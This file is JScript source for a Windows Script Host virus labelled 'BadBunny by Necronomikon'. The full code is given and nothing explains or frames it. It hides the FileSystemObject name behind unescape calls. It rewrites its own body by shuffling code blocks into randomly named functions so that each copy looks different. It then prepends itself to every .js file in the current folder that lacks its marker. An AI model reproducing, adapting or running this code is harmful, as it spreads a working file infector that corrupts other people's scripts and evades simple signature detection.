// BadBunny by Necronomikon
var FSO=WScript.CreateObject(unescape("%53")+unescape("%63")+unescape("%72")+unescape("%69")+unescape("%50")+unescape("%74")+unescape("%69")+"n"+unescape("%67")+"."+unescape("%46")+unescape("%69")+"l"+unescape("%65")+unescape("%53")+unescape("%79")+unescape("%73")+unescape("%74")+unescape("%65")+"mO"+unescape("%62")+"j"+unescape("%65")+unescape("%63")+unescape("%74"))
var me=FSO.OpenTextFile(WScript.ScriptFullName,1)
var OurCode=me.Read(1759)
me.Close()
nl=String.fromCharCode(13,10); code=''; count=0; fcode=''
file=FSO.OpenTextFile(WScript.ScriptFullName).ReadAll()
for (i=0; i<file.length; i++) { check=0; if (file.charAt(i)==String.fromCharCode(123) && Math.round(Math.random()*3)==1) { foundit(); check=1 } if (!check) { code+=file.charAt(i) } }
FSO.OpenTextFile(WScript.ScriptFullName,2).Write(code+fcode)
var jsphile=new Enumerator(FSO.GetFolder(".").Files)
for(;!jsphile.atEnd();jsphile.moveNext())
{
if(FSO.GetExtensionName(jsphile.item()).toUpperCase()=="JS")
{
var filez=FSO.OpenTextFile(jsphile.item().path,1)
var Marker=filez.Read(11)
var allinone=Marker+filez.ReadAll()
filez.Close()
if(Marker!="// BadBunny")
{
var filez=FSO.OpenTextFile(jsphile.item().path,2)
filez.Write(OurCode+allinone)
filez.Close()
}
}
}
function foundit()
{
fcodea=''; count=0; randon='';
for (j=i; j<file.length; j++) { if (file.charAt(j)==String.fromCharCode(123)) { count++; } if (file.charAt(j)==String.fromCharCode(125)) { count--; } if (!count) { fcodea=file.substring(i+1,j); j=file.length; } }
for (j=0; j<Math.round(Math.random()*5)+4; j++) { randon+=String.fromCharCode(Math.round(Math.random()*25)+97) }
fcode+=nl+nl+'function '+randon+'()'+nl+String.fromCharCode(123)+nl+fcodea+nl+String.fromCharCode(125)
code+=String.fromCharCode(123)+' '+randon+'() '
i+=fcodea.length;
}
//->
